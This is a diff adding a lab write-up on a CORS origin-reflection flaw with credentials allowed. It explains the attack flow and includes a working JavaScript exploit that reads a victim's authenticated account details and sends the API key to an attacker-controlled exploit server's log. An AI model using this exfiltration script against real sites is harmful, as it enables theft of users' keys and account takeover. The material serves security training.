@@ -1,0 +1,91 @@
+# Lab 1 — CORS Vulnerability with Basic Origin Reflection
+
+**Difficulty:** Apprentice  
+**Type:** Server-Generated ACAO from Client-Specified Origin  
+**Impact:** Authenticated API key theft → Account Takeover
+
+---
+
+## Vulnerability Explanation
+
+The server reads the `Origin` header from every request and blindly mirrors it back in the `Access-Control-Allow-Origin` response header. Combined with `Access-Control-Allow-Credentials: true`, this means **any website in the world** can make authenticated requests to this server and read the responses.
+
+```
+Attacker sends:
+  GET /accountDetails
+  Origin: https://evil.com
+
+Server responds:
+  Access-Control-Allow-Origin: https://evil.com   ← mirrors blindly
+  Access-Control-Allow-Credentials: true           ← allows cookies
+  Body: {"apiKey":"secret123"}                     ← real victim data
+```
+
+---
+
+## Why `Allow-Credentials: true` is the Critical Piece
+
+```
+WITHOUT credentials:
+  Request goes out → no cookies attached → anonymous user → useless response
+
+WITH credentials: true  ← THIS IS THE BOMB
+  Request goes out → victim's session cookie attached automatically
+  Server responds → real authenticated data for that victim
+  Attacker reads → actual API key, PII, whatever is in the response
+```
+
+There is also a browser rule: if `Allow-Credentials: true`, the server **cannot** use `Allow-Origin: *`. The developer used dynamic reflection to bypass this rule — not realizing it is infinitely worse.
+
+---
+
+## Attack Flow
+
+```
+1. Victim visits your exploit page
+2. Your JS fires an XHR to victim-site.com/accountDetails
+3. Victim's browser auto-attaches their session cookie (withCredentials=true)
+4. Server sees valid session → returns real API key
+5. Server reflects your exploit origin in ACAO header
+6. Browser allows your JS to READ the response
+7. Your JS redirects victim's browser to your log server with the API key
+8. You read your access log → steal the key
+```
+
+---
+
+## Exploit
+
+```html
+<script>
+  var req = new XMLHttpRequest();
+  req.onload = reqListener;
+  req.open('get', 'https://LAB-ID.web-security-academy.net/accountDetails', true);
+  req.withCredentials = true;
+  req.send();
+
+  function reqListener() {
+    location = 'https://EXPLOIT-SERVER-ID.exploit-server.net/log?key='
+               + encodeURIComponent(this.responseText);
+  }
+</script>
+```
+
+---
+
+## Vulnerable Server Code
+
+See [`vuln/vuln.js`](./vuln/vuln.js) and [`vuln/vuln.py`](./vuln/vuln.py)
+
+## Fix
+
+See [`fix/fix.js`](./fix/fix.js), [`fix/fix.py`](./fix/fix.py) and [`fix/notes.md`](./fix/notes.md)
+
+---
+
+## CVSS
+
+```
+Score:  9.3 Critical
+Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
+```
